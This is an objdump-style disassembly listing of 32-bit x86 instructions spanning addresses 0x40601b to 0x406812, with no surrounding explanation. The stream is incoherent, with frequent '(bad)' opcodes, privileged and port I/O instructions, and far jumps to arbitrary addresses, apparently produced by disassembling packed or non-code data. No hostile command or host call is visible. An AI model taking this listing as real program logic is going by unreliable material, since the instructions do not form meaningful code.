  40601b:	arpl   WORD PTR [esi-0x3a],bp
  40601e:	mov    ah,BYTE PTR [ebx-0x3]
  406021:	je     0x405fca
  406023:	mov    ds:0x92e6575a,eax
  406028:	mov    esp,0xd477c6e8
  40602d:	stc    
  40602e:	inc    ecx
  40602f:	je     0x40604a
  406031:	mov    dl,0xb5
  406033:	jo     0x405ff2
  406035:	mov    ah,0x21
  406037:	jl     0x40603b
  406039:	div    ecx
  40603b:	or     BYTE PTR [eax+0x45],cl
  40603e:	(bad)  
  40603f:	adc    DWORD PTR [ecx],edi
  406041:	dec    ebx
  406042:	and    dh,al
  406044:	rcr    bl,cl
  406046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406047:	repnz jmp 0xb9d4:0x105f5558
  40604f:	adc    eax,0xe2263fd9
  406054:	mov    edx,0xdbad098
  406059:	cmp    BYTE PTR [edi+edi*2-0x4529a22d],ah
  406060:	icebp  
  406061:	jno    0x4060a1
  406063:	jno    0x40609a
  406065:	mov    eax,ds:0xa48d3986
  40606a:	inc    edi
  40606b:	inc    ebx
  40606c:	loopne 0x4060db
  40606e:	bound  ecx,QWORD PTR [edi-0x7]
  406071:	xor    ah,BYTE PTR ds:0xd0bd513f
  406077:	xchg   DWORD PTR [edi+0x2e],edi
  40607a:	bound  ebx,QWORD PTR [ecx-0x55f433e0]
  406080:	outs   dx,BYTE PTR ds:[esi]
  406081:	sub    edi,esp
  406083:	cmp    BYTE PTR [ecx],ah
  406085:	hlt    
  406086:	fwait
  406087:	adc    al,0xb4
  406089:	inc    esp
  40608a:	lea    esp,[ebx+0x73a2bf3e]
  406090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406091:	dec    edx
  406092:	leave  
  406093:	ret    
  406094:	dec    ebp
  406095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406096:	pop    ds
  406097:	sbb    DWORD PTR [edi*8-0x2b3c90a9],esi
  40609e:	dec    esi
  40609f:	stos   DWORD PTR es:[edi],eax
  4060a0:	inc    BYTE PTR [esi+0x66beb866]
  4060a6:	jmp    0x4060e5
  4060a8:	pop    ss
  4060a9:	les    esp,FWORD PTR ds:0x969624aa
  4060af:	jge    0x78e87fed
  4060b5:	mov    esi,0x656da1b5
  4060ba:	lods   al,BYTE PTR ds:[esi]
  4060bb:	nop
  4060bc:	push   ds
  4060bd:	ds push 0xffffffec
  4060c0:	xchg   esi,eax
  4060c1:	mov    ch,0x54
  4060c3:	mov    ds:0x820243fb,al
  4060c8:	or     eax,0xcd784890
  4060cd:	iret   
  4060ce:	scas   eax,DWORD PTR es:[edi]
  4060cf:	xchg   ebx,edi
  4060d1:	xor    al,0xdc
  4060d3:	xor    al,0x9c
  4060d5:	pop    edi
  4060d6:	aam    0x60
  4060d8:	popf   
  4060d9:	mov    al,ds:0xf42344c2
  4060de:	xchg   edi,eax
  4060df:	das    
  4060e0:	popf   
  4060e1:	das    
  4060e2:	in     al,0x6e
  4060e4:	cwde   
  4060e5:	not    esp
  4060e7:	push   ebx
  4060e8:	lahf   
  4060e9:	retf   
  4060ea:	cli    
  4060eb:	lds    ebp,FWORD PTR [eax-0x5b]
  4060ee:	test   eax,0xedafd4ec
  4060f3:	push   ecx
  4060f4:	jecxz  0x4060bd
  4060f6:	int3   
  4060f7:	(bad)  
  4060f9:	fstp   DWORD PTR ds:0x37153a46
  4060ff:	xchg   edi,eax
  406100:	popa   
  406101:	xchg   ebx,eax
  406102:	cs add edx,ebp
  406105:	sub    al,0x3f
  406107:	dec    esi
  406108:	call   0x52d0:0xf9fbc82b
  40610f:	leave  
  406110:	add    al,0xf2
  406112:	sub    al,BYTE PTR [ebp-0x1b970c1d]
  406118:	loopne 0x406186
  40611a:	push   0x18
  40611c:	outs   dx,BYTE PTR ds:[esi]
  40611d:	ds pushf 
  40611f:	cmp    al,0xf2
  406121:	pushf  
  406122:	and    BYTE PTR [edi],al
  406124:	mov    eax,ds:0x418e9f17
  406129:	push   0xc9b7e10
  40612e:	cld    
  40612f:	cmp    al,BYTE PTR [edi+0x5b]
  406132:	test   BYTE PTR [ecx+ecx*8],cl
  406135:	xor    bh,BYTE PTR [edx-0x7389b19f]
  40613b:	xchg   edx,eax
  40613c:	mov    WORD PTR [edx-0x72],?
  40613f:	sbb    ecx,DWORD PTR [ecx-0x90326c1]
  406145:	gs dec esp
  406147:	data16 ins BYTE PTR es:[edi],dx
  406149:	mov    ds:0x442d5d57,al
  40614e:	in     eax,0x21
  406150:	pop    ds
  406151:	test   eax,0xabcaa370
  406156:	dec    edi
  406157:	int    0xa9
  406159:	ss in  al,0xa6
  40615c:	pop    ss
  40615d:	ja     0x4061d5
  40615f:	pop    es
  406160:	mov    eax,0x34858d05
  406165:	(bad)  
  406166:	sub    DWORD PTR ds:0x4bb91c29,edx
  40616c:	push   ebp
  40616d:	inc    edx
  40616e:	rcr    DWORD PTR [edx-0x78],1
  406171:	cdq    
  406172:	clc    
  406173:	ret    
  406174:	loopne 0x40616a
  406176:	add    eax,0x6c9c41a5
  40617b:	int    0xb
  40617d:	inc    esi
  40617e:	inc    esp
  40617f:	jne    0x4061bb
  406181:	mov    cl,0xb2
  406183:	add    dh,dh
  406185:	cwde   
  406186:	out    dx,al
  406187:	jmp    0xcd47:0x24a3c33c
  40618e:	jmp    0xebb0:0x311668b6
  406195:	ror    BYTE PTR [ebp+0x4d],0xdb
  406199:	mov    bh,0x3c
  40619b:	lds    ebx,FWORD PTR [edx+0x7fb484e4]
  4061a1:	les    ecx,FWORD PTR [edx+0x59deab26]
  4061a7:	stos   BYTE PTR es:[edi],al
  4061a8:	sub    ah,BYTE PTR [esp+ebx*8-0x266487ad]
  4061af:	rcr    DWORD PTR [esi+0x49],cl
  4061b2:	retf   
  4061b3:	cmp    eax,0x9e2d7128
  4061b8:	jae    0x406191
  4061ba:	stc    
  4061bb:	mov    edi,0xf2f8ada3
  4061c0:	or     BYTE PTR [eax+0x7b],dh
  4061c3:	pusha  
  4061c4:	add    BYTE PTR [edx+0x3e1340ef],cl
  4061ca:	adc    dl,al
  4061cc:	(bad)  
  4061cd:	dec    edi
  4061ce:	pop    edx
  4061cf:	inc    esi
  4061d0:	and    ecx,ebx
  4061d2:	jbe    0x40617c
  4061d4:	dec    edi
  4061d5:	and    DWORD PTR [eax],ebp
  4061d7:	push   ds
  4061d8:	sar    BYTE PTR [edi-0x41],0x70
  4061dc:	aas    
  4061dd:	cmp    edx,eax
  4061df:	inc    ecx
  4061e0:	dec    ebx
  4061e1:	dec    ecx
  4061e2:	imul   ebx,eax,0xeb336517
  4061e8:	dec    edi
  4061e9:	das    
  4061ea:	int3   
  4061eb:	push   ds
  4061ec:	inc    esi
  4061ed:	mov    WORD PTR [esi],?
  4061ef:	or     DWORD PTR [ecx],esp
  4061f1:	test   edx,esp
  4061f3:	jo     0x4061de
  4061f5:	into   
  4061f6:	pop    ebp
  4061f7:	retf   
  4061f8:	mov    ds,ecx
  4061fa:	hlt    
  4061fb:	cdq    
  4061fc:	mov    ebp,0xf444c707
  406201:	add    DWORD PTR [ebp-0x1c],esi
  406204:	emms   
  406206:	dec    eax
  406207:	jmp    0x9cc46dba
  40620c:	xlat   BYTE PTR ds:[ebx]
  40620d:	repnz sahf 
  40620f:	popf   
  406210:	int3   
  406211:	sti    
  406212:	jo     0x40627c
  406214:	popf   
  406215:	es pop es
  406217:	enter  0xfbb1,0x3d
  40621b:	(bad)  
  40621c:	add    edi,DWORD PTR [esi-0x57]
  40621f:	mov    DWORD PTR [esi],esi
  406221:	sub    bl,BYTE PTR [esp+ecx*8+0xbf8b8f5]
  406228:	adc    eax,0x259b6032
  40622d:	pop    esi
  40622e:	int3   
  40622f:	test   BYTE PTR ds:0x6dfb9933,0x79
  406236:	and    al,0x4b
  406238:	inc    ecx
  406239:	sbb    dl,BYTE PTR [eax-0x633d5c79]
  40623f:	in     eax,dx
  406240:	and    BYTE PTR [eax],0x12
  406243:	xor    ebx,edi
  406245:	mov    dh,BYTE PTR [ebp-0x782af0eb]
  40624b:	push   0x39a509e4
  406250:	aas    
  406251:	push   esp
  406252:	add    BYTE PTR [edi],bh
  406254:	aaa    
  406255:	adc    esi,DWORD PTR [eax+0x306e65a4]
  40625b:	clc    
  40625c:	dec    eax
  40625d:	sbb    esi,esp
  40625f:	push   ds
  406260:	jns    0x4062d5
  406262:	fsubp  st(7),st
  406264:	push   ds
  406265:	sub    al,0x7a
  406267:	dec    edi
  406268:	and    dh,BYTE PTR [eax-0x5c991b1a]
  40626e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40626f:	fsub   QWORD PTR [eax]
  406271:	addr16 imul ecx,esp,0xffffff9a
  406275:	icebp  
  406276:	icebp  
  406277:	cmc    
  406278:	daa    
  406279:	leave  
  40627a:	xchg   esp,eax
  40627b:	and    BYTE PTR [ebp-0x5e98a48a],ch
  406281:	aas    
  406282:	pop    ebx
  406283:	jae    0x4062e2
  406285:	push   esp
  406286:	cmp    DWORD PTR [ebx-0x165124d0],ebp
  40628c:	push   esi
  40628d:	mov    eax,0x8f8db3e
  406292:	repz mov ah,BYTE PTR [edx]
  406295:	jbe    0x40630d
  406297:	cmp    al,0x2f
  406299:	cmp    dh,ah
  40629b:	ja     0x406233
  40629d:	mov    ebp,0x7014d805
  4062a2:	(bad)  
  4062a3:	cwde   
  4062a4:	push   ecx
  4062a5:	jge    0x406309
  4062a7:	mov    esi,0x4540e271
  4062ac:	mov    esi,0x271851d8
  4062b1:	xor    ebx,DWORD PTR [edi]
  4062b3:	jne    0x406241
  4062b5:	loop   0x4062bb
  4062b7:	adc    ah,ch
  4062b9:	(bad)
  4062bc:	mov    ebp,0x9684dc2c
  4062c1:	cli    
  4062c2:	hlt    
  4062c3:	mov    bh,0x53
  4062c5:	xchg   esi,eax
  4062c6:	rol    DWORD PTR [edi],1
  4062c8:	in     eax,0x7f
  4062ca:	fnsave [ebx]
  4062cc:	cmp    ebp,DWORD PTR [ebp-0x6f835266]
  4062d2:	fisttp QWORD PTR [ebx-0x26]
  4062d5:	popf   
  4062d6:	dec    ecx
  4062d7:	(bad)  
  4062d8:	push   esi
  4062d9:	fstp   DWORD PTR [edi-0x579fab37]
  4062df:	ins    DWORD PTR es:[edi],dx
  4062e0:	push   0x42
  4062e2:	cmc    
  4062e3:	enter  0xfc7d,0x3e
  4062e7:	and    BYTE PTR [edx-0x3],al
  4062ea:	xchg   ecx,eax
  4062eb:	retf   
  4062ec:	jns    0x4062c9
  4062ee:	mov    eax,ds:0x23ef981b
  4062f3:	not    BYTE PTR gs:[esi+0x3a23e5ca]
  4062fa:	scas   al,BYTE PTR es:[edi]
  4062fb:	mov    esp,0xdc54733e
  406300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406301:	adc    ecx,edx
  406303:	loop   0x40637a
  406305:	push   ebx
  406306:	push   0xffffff82
  406308:	or     DWORD PTR [ecx],0xffffffb2
  40630b:	xchg   ebx,eax
  40630c:	jg     0x406330
  40630e:	sbb    ebx,DWORD PTR [edx-0x7e97d644]
  406314:	cmp    BYTE PTR [esp+esi*1-0x29450b66],bl
  40631b:	das    
  40631c:	inc    edx
  40631d:	mov    cl,cl
  40631f:	std    
  406320:	fsub   QWORD PTR [esp+ebx*2+0x64]
  406324:	outs   dx,BYTE PTR ds:[esi]
  406325:	adc    eax,0x6e33ada1
  40632a:	or     ah,ah
  40632c:	xor    eax,0x381997db
  406331:	push   cs
  406332:	or     al,0xb6
  406334:	fld    TBYTE PTR [ecx+0x8]
  406337:	idiv   DWORD PTR [edx-0xe6fbded]
  40633d:	es test eax,0xecb7b259
  406343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406344:	cmp    ah,BYTE PTR [eax]
  406346:	ins    BYTE PTR es:[edi],dx
  406347:	xor    BYTE PTR [edi+eiz*4+0x3d682643],0x72
  40634f:	dec    edi
  406350:	(bad)  
  406351:	(bad)  
  406352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406353:	fild   DWORD PTR [edx+0x318748af]
  406359:	leave  
  40635a:	mov    esi,0xf7725ec3
  40635f:	lock push ss
  406361:	add    BYTE PTR [edx+0x2efbf67a],ch
  406367:	adc    edx,ebp
  406369:	pop    esi
  40636a:	ret    0x5b7b
  40636d:	xchg   ebx,eax
  40636e:	sar    BYTE PTR [esi-0x74c00a7e],1
  406374:	(bad)  
  406375:	(bad)  
  406376:	vpshld ymm12,xmm1,xmm2
  40637b:	arpl   WORD PTR [ecx],sp
  40637d:	cwde   
  40637e:	xchg   ebp,eax
  40637f:	or     esi,DWORD PTR [ecx]
  406381:	xor    al,0x75
  406383:	ins    BYTE PTR es:[edi],dx
  406384:	xchg   edi,eax
  406385:	retf   
  406386:	popa   
  406387:	call   FWORD PTR [esi-0x58]
  40638a:	hlt    
  40638b:	jbe    0x4063a8
  40638d:	mov    ecx,0xf1a64bb4
  406392:	mov    dl,0x13
  406394:	cmp    ebx,ecx
  406396:	dec    edi
  406397:	jmp    0x40638e
  406399:	push   cs
  40639a:	lods   eax,DWORD PTR ds:[esi]
  40639b:	fcmovnbe st,st(4)
  40639d:	ret    0x15a6
  4063a0:	jno    0x4063f3
  4063a2:	test   al,0xcd
  4063a4:	adc    DWORD PTR [esi],ecx
  4063a6:	scas   eax,DWORD PTR es:[edi]
  4063a7:	xor    DWORD PTR [ecx],ebx
  4063a9:	sbb    ch,BYTE PTR [ebx-0x147cdb9d]
  4063af:	loopne 0x406418
  4063b1:	call   FWORD PTR ds:0xc423f8e9
  4063b7:	nop
  4063b8:	imul   eax,esp,0x5c192ff5
  4063be:	ins    BYTE PTR es:[edi],dx
  4063bf:	sbb    ch,BYTE PTR [edi-0x11862315]
  4063c5:	inc    BYTE PTR gs:[edi+0x71c563ca]
  4063cc:	sub    dl,BYTE PTR [ecx-0x7ce11312]
  4063d2:	mov    ecx,0x31e0a76
  4063d7:	add    BYTE PTR [ebx-0x2a24c4d5],ch
  4063dd:	push   edx
  4063de:	inc    esi
  4063df:	adc    bh,BYTE PTR [esi+0x46b54d08]
  4063e5:	loopne 0x40637d
  4063e7:	sar    dl,0x41
  4063ea:	jbe    0x406373
  4063ec:	push   esp
  4063ed:	mov    bl,0x3b
  4063ef:	daa    
  4063f0:	fdiv   DWORD PTR [ebx]
  4063f2:	sbb    BYTE PTR [esi],ch
  4063f4:	rcr    al,0xfa
  4063f7:	push   edi
  4063f8:	daa    
  4063f9:	xchg   edx,eax
  4063fa:	mov    ds:0x4e9cddf1,eax
  4063ff:	xchg   ecx,eax
  406400:	in     al,0x3c
  406402:	in     al,0x1e
  406404:	ds rol al,cl
  406407:	test   al,0x66
  406409:	fiadd  WORD PTR [edi-0x63]
  40640c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40640d:	repnz fdivr QWORD PTR [esi-0x5531eca6]
  406414:	fidivr DWORD PTR [esi+0x40eede17]
  40641a:	jnp    0x406443
  40641c:	cmp    eax,0x5b957d9
  406421:	repz xchg edi,eax
  406423:	push   esi
  406424:	pop    edx
  406425:	daa    
  406426:	xor    DWORD PTR [eax-0x46],edi
  406429:	div    DWORD PTR [eax+0x5a228ff2]
  40642f:	out    dx,eax
  406430:	sub    al,0x74
  406432:	imul   ebp,DWORD PTR [eax-0x4f91635e],0x314e24d3
  40643c:	lock test DWORD PTR [edi],esp
  40643f:	cmp    eax,0x6bd3b731
  406444:	inc    ecx
  406445:	scas   eax,DWORD PTR es:[edi]
  406446:	test   DWORD PTR [ebx-0x46],esi
  406449:	leave  
  40644a:	dec    edi
  40644b:	sub    al,0x29
  40644d:	xchg   ebx,eax
  40644e:	mov    edx,0x9745a46
  406453:	ret    0xeab0
  406456:	add    BYTE PTR [edi+ebp*2-0x7b],0xa6
  40645b:	xor    esi,DWORD PTR [eax-0x1b]
  40645e:	pop    esp
  40645f:	stos   DWORD PTR es:[edi],eax
  406460:	sbb    DWORD PTR [ebx+0x2539c92b],esp
  406466:	aaa    
  406467:	sub    al,0x62
  406469:	pop    edx
  40646a:	fidivr WORD PTR [eax]
  40646c:	mul    BYTE PTR [ecx]
  40646e:	enter  0xc9a5,0x1a
  406472:	aas    
  406473:	jmp    0xd54b:0x66e43fe2
  40647a:	(bad)  
  40647b:	fidivr WORD PTR [eax]
  40647d:	test   al,0x7d
  40647f:	stos   BYTE PTR es:[edi],al
  406480:	fisub  DWORD PTR ds:0xa52c8d65
  406486:	and    ah,cl
  406488:	fsubr  DWORD PTR [ebx-0x62bdf5cf]
  40648e:	mov    esp,0xa53c4cf3
  406493:	push   eax
  406494:	out    0xcb,eax
  406496:	push   edi
  406497:	mov    cl,0xfc
  406499:	mov    ah,0x50
  40649b:	sbb    DWORD PTR [edx-0x77f76dc1],esi
  4064a1:	cmp    BYTE PTR [esi+0x5bad7ecb],al
  4064a7:	sub    eax,0x72c36495
  4064ac:	mov    eax,0xbac70967
  4064b1:	push   es
  4064b2:	sub    BYTE PTR [eax],cl
  4064b4:	inc    ecx
  4064b5:	ret    
  4064b6:	pop    ebp
  4064b7:	inc    ebx
  4064b8:	rol    BYTE PTR [ebx],0xe9
  4064bb:	aas    
  4064bc:	jns    0x4064fe
  4064be:	jno    0x4064f1
  4064c0:	test   al,0x8d
  4064c2:	popf   
  4064c3:	sub    al,ch
  4064c5:	arpl   di,di
  4064c7:	and    edi,edx
  4064c9:	or     DWORD PTR [edx+0x3b],ebx
  4064cc:	jp     0x4064f5
  4064ce:	pop    edx
  4064cf:	add    ebp,edx
  4064d1:	dec    ebx
  4064d2:	lock sar DWORD PTR [esi-0x30ffb88e],cl
  4064d9:	mov    al,ds:0x273813d5
  4064de:	ds pop ss
  4064e0:	mov    ecx,0x7d5d540a
  4064e5:	xchg   ebx,eax
  4064e6:	add    BYTE PTR [ecx+eax*4-0x44],bl
  4064ea:	imul   eax
  4064ec:	sub    ah,BYTE PTR [esi+edx*4]
  4064ef:	test   eax,0x7f102308
  4064f4:	sub    eax,0xca412179
  4064f9:	jl     0x406513
  4064fb:	mov    BYTE PTR [ecx-0x27],0x12
  4064ff:	xchg   ebx,eax
  406500:	xchg   edx,eax
  406501:	test   al,0xec
  406503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406504:	mov    DWORD PTR [edx],ecx
  406506:	ja     0x406561
  406508:	bound  esp,QWORD PTR [ebx]
  40650a:	or     DWORD PTR [edi-0x4],ecx
  40650d:	imul   edi,DWORD PTR [ebx-0x39d70a7f],0x80651c2d
  406517:	mov    ecx,0xc446b6dd
  40651c:	mov    edx,0x47d4aa5
  406521:	mov    dh,0x47
  406523:	sub    eax,DWORD PTR [edi]
  406525:	repz add eax,0x56e6cd7e
  40652b:	retf   
  40652c:	ja     0x4064d4
  40652e:	jle    0x4064bf
  406530:	xor    eax,0x864d2164
  406535:	and    DWORD PTR [ebx+esi*4-0x5e5a930e],esp
  40653c:	jmp    0x406551
  40653e:	sbb    al,BYTE PTR [eax-0x2c]
  406541:	test   DWORD PTR [edi],ebx
  406543:	sahf   
  406544:	mov    dh,0x39
  406546:	xchg   DWORD PTR [esi+0x6c],eax
  406549:	hlt    
  40654a:	std    
  40654b:	ror    ch,0x6d
  40654e:	retf   
  40654f:	cmc    
  406550:	popa   
  406551:	xor    al,0x77
  406553:	xor    al,0x3b
  406555:	or     BYTE PTR [eax],0x35
  406558:	into   
  406559:	iret   
  40655a:	icebp  
  40655b:	adc    eax,0x128a0078
  406560:	stc    
  406561:	sub    al,0x8c
  406563:	inc    ebx
  406564:	test   al,0x0
  406566:	lods   al,BYTE PTR ds:[esi]
  406567:	retf   
  406568:	sub    eax,0x320c0a4
  40656d:	fcomip st,st(4)
  40656f:	in     al,0x3e
  406571:	mov    ebx,0xb28864dd
  406576:	dec    edx
  406577:	stos   DWORD PTR es:[di],eax
  406579:	out    dx,eax
  40657a:	ins    BYTE PTR es:[edi],dx
  40657b:	push   edx
  40657c:	inc    ebp
  40657d:	cmp    al,0x3e
  40657f:	mov    ch,0xa8
  406581:	and    ah,BYTE PTR [ebp+0x4d]
  406584:	enter  0x8d1b,0xf9
  406588:	add    al,0x0
  40658a:	xchg   edi,eax
  40658b:	ficom  DWORD PTR [esi-0x14f30d5a]
  406591:	or     esp,DWORD PTR ds:0xca54c667
  406597:	stos   BYTE PTR es:[edi],al
  406598:	sub    eax,edx
  40659a:	pop    ss
  40659b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40659c:	mov    al,0x39
  40659e:	mov    al,ds:0xee62354
  4065a3:	mul    edx
  4065a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a6:	je     0x406531
  4065a8:	push   esp
  4065a9:	cmp    eax,0xfbbae2c8
  4065ae:	or     ch,BYTE PTR [ebx-0xe]
  4065b1:	mov    al,ds:0x9cace389
  4065b6:	pop    ebx
  4065b7:	pop    esp
  4065b8:	iret   
  4065b9:	call   0xc3d7:0x30e0ea8
  4065c0:	xor    BYTE PTR [ebx-0x2e1d1745],0xc8
  4065c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c8:	iret   
  4065c9:	mov    DWORD PTR [eax-0x79],eax
  4065cc:	adc    DWORD PTR [eax],0x16
  4065cf:	push   edx
  4065d0:	and    bl,dh
  4065d2:	push   ebp
  4065d3:	push   eax
  4065d4:	jne    0x406625
  4065d6:	dec    esi
  4065d7:	clc    
  4065d8:	daa    
  4065d9:	add    edx,esi
  4065db:	push   cs
  4065dc:	int3   
  4065dd:	cmp    BYTE PTR [eax-0x7],dh
  4065e0:	out    dx,al
  4065e1:	out    0xbf,al
  4065e3:	icebp  
  4065e4:	dec    esi
  4065e5:	das    
  4065e6:	(bad)  
  4065e7:	sbb    al,0x7b
  4065e9:	aas    
  4065ea:	pop    ecx
  4065eb:	outs   dx,DWORD PTR ds:[esi]
  4065ec:	nop
  4065ed:	cmp    al,cl
  4065ef:	mov    dh,0x40
  4065f1:	nop
  4065f2:	xor    BYTE PTR [edi],cl
  4065f4:	daa    
  4065f5:	jbe    0x4065e9
  4065f7:	mov    eax,ds:0x94c32940
  4065fc:	fidivr WORD PTR [ebp+0x74]
  4065ff:	pop    ecx
  406600:	push   eax
  406601:	add    eax,0x159c7aba
  406606:	(bad)  
  406607:	mov    edi,0x6f00750d
  40660c:	inc    edx
  40660d:	stos   DWORD PTR es:[edi],eax
  40660e:	stc    
  40660f:	ins    BYTE PTR es:[edi],dx
  406610:	inc    eax
  406611:	mov    dl,0x68
  406613:	sbb    dh,BYTE PTR [ebx-0x39]
  406616:	xchg   edx,eax
  406617:	ret    0x4a4e
  40661a:	cmp    bh,ch
  40661c:	shl    dh,1
  40661e:	mov    dh,0xe6
  406620:	add    al,0x31
  406622:	nop
  406623:	xchg   ebx,eax
  406624:	sbb    esp,ecx
  406626:	int    0xf
  406628:	push   ecx
  406629:	fs mov cl,0x2f
  40662c:	scas   al,BYTE PTR es:[edi]
  40662d:	push   edx
  40662e:	loopne 0x4065cb
  406630:	adc    eax,edx
  406632:	(bad)  
  406634:	imul   ebp,DWORD PTR [edi-0x25f0fa8f],0xffffffb2
  40663b:	dec    ecx
  40663c:	loopne 0x4065f2
  40663e:	jp     0x406662
  406640:	sub    edi,esp
  406642:	int3   
  406643:	aas    
  406644:	inc    ebx
  406645:	mov    esp,0xa6fdb1bd
  40664a:	neg    ecx
  40664c:	inc    edi
  40664d:	(bad)  [ecx]
  40664f:	jno    0x406631
  406651:	je     0x4065f6
  406653:	xchg   edi,eax
  406654:	sti    
  406655:	mov    esp,fs
  406657:	or     ah,bl
  406659:	push   0xb
  40665b:	sar    BYTE PTR [bp+si],cl
  40665e:	jecxz  0x4066c4
  406660:	shl    DWORD PTR [eax-0x2a4b05b3],cl
  406666:	add    ecx,DWORD PTR [eax-0x56744962]
  40666c:	xchg   ebx,eax
  40666d:	or     esp,DWORD PTR [edi-0x67]
  406670:	inc    edi
  406671:	mov    edx,0xad30c1ac
  406676:	and    BYTE PTR [edx+0x2e],ah
  406679:	and    BYTE PTR [ebx-0x11],cl
  40667c:	and    al,0x13
  40667e:	xor    eax,0x8fb12241
  406683:	test   BYTE PTR [ecx+0x195d4ef1],ch
  406689:	out    dx,al
  40668a:	inc    ebx
  40668b:	mov    ebx,0xaca42121
  406690:	mov    ecx,0x37449261
  406695:	pusha  
  406696:	lahf   
  406697:	ds test al,0x69
  40669a:	cmp    BYTE PTR [ebx-0x62],al
  40669d:	pop    ecx
  40669e:	jecxz  0x4066f2
  4066a0:	out    dx,eax
  4066a1:	repz adc BYTE PTR [ecx],dl
  4066a4:	and    al,0xa
  4066a6:	xor    edi,DWORD PTR [eax]
  4066a8:	bound  eax,QWORD PTR [ecx-0x66]
  4066ab:	xchg   esp,eax
  4066ac:	cmp    eax,0xac6399a2
  4066b1:	bound  eax,QWORD PTR [eax-0xa5cddd2]
  4066b7:	mov    edx,0x4f926eaf
  4066bc:	nop
  4066bd:	ds pop ds
  4066bf:	iret   
  4066c0:	out    0x2a,al
  4066c2:	pcmpgtd mm4,QWORD PTR [esi]
  4066c5:	retf   
  4066c6:	jmp    0x4066fc
  4066c8:	push   eax
  4066c9:	(bad)  
  4066ca:	ins    BYTE PTR es:[edi],dx
  4066cb:	and    ebx,DWORD PTR [ebx+0x5a8a98e5]
  4066d1:	jp     0x40665d
  4066d3:	or     al,0xc0
  4066d5:	jmp    0xca9a:0x46ef8d7b
  4066dc:	push   0xaa0ff921
  4066e1:	pop    ecx
  4066e2:	cmp    al,al
  4066e4:	sti    
  4066e5:	int3   
  4066e6:	mov    esi,0x4562e38f
  4066eb:	setle  BYTE PTR [edi+0x7cedef57]
  4066f2:	and    dl,BYTE PTR [edi]
  4066f4:	inc    edx
  4066f5:	jo     0x40669f
  4066f7:	adc    ch,BYTE PTR [ebp-0x2a19d1a2]
  4066fd:	fcomp  QWORD PTR es:[edx*1-0x2feb7af3]
  406705:	mov    ebp,0x815da20a
  40670a:	jno    0x4066ec
  40670c:	mov    ebx,DWORD PTR [esi]
  40670e:	and    ebx,esp
  406710:	(bad)
  406713:	test   DWORD PTR [eax],0xa5f0c74e
  406719:	pop    ecx
  40671a:	jb     0x40676c
  40671c:	(bad)  
  40671d:	and    DWORD PTR [ebp-0x8],ebp
  406720:	out    dx,eax
  406721:	call   0x2d89f07f
  406726:	retf   0x5e48
  406729:	mov    eax,0xa66551b1
  40672e:	mov    DWORD PTR [esi],esi
  406730:	loop   0x406756
  406732:	outs   dx,BYTE PTR ds:[esi]
  406733:	or     dh,BYTE PTR [ebx+0x57]
  406736:	(bad)  
  406737:	out    0x48,al
  406739:	icebp  
  40673a:	les    ebp,FWORD PTR [esi+0x17]
  40673d:	in     eax,0x2c
  40673f:	push   0xf
  406741:	shl    DWORD PTR [esi],0x81
  406744:	mov    ah,0x94
  406746:	adc    ch,0xe8
  406749:	popa   
  40674a:	int3   
  40674b:	or     bl,BYTE PTR [ecx]
  40674d:	(bad)
  406751:	nop
  406752:	and    edx,DWORD PTR [ecx+0x1a8a5b46]
  406758:	push   cs
  406759:	mov    ds:0x375503be,al
  40675e:	pop    ss
  40675f:	sbb    eax,esp
  406761:	les    eax,FWORD PTR [esp+eiz*8]
  406764:	jae    0x4067bd
  406766:	sub    BYTE PTR [ebp+0x27],bh
  406769:	lods   al,BYTE PTR ds:[esi]
  40676a:	mov    dh,0x7d
  40676c:	xchg   edx,eax
  40676d:	into   
  40676e:	(bad)  
  40676f:	sti    
  406770:	cld    
  406771:	push   ds
  406772:	loop   0x40679a
  406774:	arpl   WORD PTR ds:0x33cef17,si
  40677a:	pop    edx
  40677b:	cmp    eax,0x32fc0766
  406780:	mov    ds:0x61f98951,al
  406785:	(bad)  
  406786:	push   edx
  406787:	lahf   
  406788:	outs   dx,DWORD PTR ds:[esi]
  406789:	cld    
  40678a:	push   ecx
  40678b:	lods   al,BYTE PTR ds:[esi]
  40678c:	add    al,0x25
  40678e:	xor    eax,0xe4da80fe
  406793:	pop    esp
  406794:	pop    ds
  406795:	inc    eax
  406796:	mov    ecx,0xd74d2f92
  40679b:	pop    es
  40679c:	add    bh,BYTE PTR [ebp-0x51b8b1d1]
  4067a2:	mov    bh,0x33
  4067a4:	adc    al,0xc
  4067a6:	jmp    0x406798
  4067a8:	adc    BYTE PTR [ecx-0x47],bh
  4067ab:	in     al,0xf4
  4067ad:	sbb    DWORD PTR [esi+0x39bf78a3],esp
  4067b3:	loopne 0x4067e9
  4067b5:	adc    al,0x6c
  4067b7:	cmc    
  4067b8:	and    eax,0x6c172da5
  4067bd:	imul   ebx,esp,0x47a1d78f
  4067c3:	pop    edx
  4067c4:	dec    bh
  4067c6:	loope  0x4067c6
  4067c8:	jg     0x406776
  4067ca:	add    BYTE PTR [edx+0x5],dl
  4067cd:	mov    al,ds:0x7624ec61
  4067d2:	cmp    eax,0x95c5cecf
  4067d7:	jmp    0x4067b9
  4067d9:	xchg   ecx,eax
  4067da:	inc    BYTE PTR [esi-0x4a]
  4067dd:	add    BYTE PTR [ecx-0x127bf5d4],cl
  4067e3:	mov    ?,ebp
  4067e5:	fsubr  DWORD PTR [eax-0x13e2dfbf]
  4067eb:	push   es
  4067ec:	mov    DWORD PTR [ecx+eax*2],0xf4179029
  4067f3:	loope  0x406834
  4067f5:	or     al,0x4e
  4067f7:	not    BYTE PTR [ecx+0x69]
  4067fa:	out    dx,eax
  4067fb:	mov    dh,0x2e
  4067fd:	retf   0x83d1
  406800:	std    
  406801:	idiv   BYTE PTR [edx-0x39]
  406804:	mov    ebp,0xff5da184
  406809:	fcom   QWORD PTR [esi+0x17]
  40680c:	jle    0x406798
  40680e:	mov    cl,0xc7
  406810:	jo     0x406794
  406812:	jbe    0x406850
